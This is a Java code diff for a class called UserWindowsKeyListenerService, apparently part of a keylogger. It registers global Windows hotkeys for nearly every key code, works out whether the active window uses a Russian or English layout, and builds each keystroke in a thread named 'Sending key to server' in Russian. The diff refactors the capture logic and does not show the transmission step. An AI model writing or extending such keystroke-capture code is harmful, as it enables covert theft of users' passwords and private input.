@@ -48,7 +48,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	}
 
 	@Override
-	public void run() throws Exception {
+	public void run() {
 		CompletableFuture.runAsync(() -> {
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
@@ -95,18 +95,26 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						User32.UnregisterHotKey(null, this.id + 3000);
 						User32.UnregisterHotKey(null, this.id + 4000);
 						
+						final int idTemp = this.id;
+						final boolean isRus = this.isRus;
+						final boolean isCapsLock = this.isCapsLock;
+						
 						CompletableFuture.runAsync(() -> {	
 							Thread.currentThread().setName("Отправление клавиши на сервер");
-							if(this.id == 20)
-								this.isCapsLock = !this.isCapsLock;
+							
+							boolean isRusTemp = isRus;
+							boolean isCapsLockTemp = isCapsLock;
+							
+							if(idTemp == 20)
+								isCapsLockTemp = !isCapsLockTemp;
 
-							this.isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
-							String key = this.isRus ? getRusKey(this.id) : getEngKey(this.id);
+							isRusTemp = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
+							String key = isRusTemp ? getRusKey(idTemp) : getEngKey(idTemp);
 						
 							if(User32.GetKeyState(16) < 0){
-								key = this.getShiftKey(this.id, key);
-							}else if(this.isCapsLock){
-								if(65 <= this.id && this.id <= 90){
+								key = this.getShiftKey(idTemp, key);
+							}else if(isCapsLockTemp){
+								if(65 <= idTemp && idTemp <= 90){
 									key = key.toUpperCase();
 								}
 							}
@@ -159,7 +167,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	}
 
 	@Override
-	public void stop() throws Exception {
+	public void stop() {
 		this.isRun = false;
 	}
 
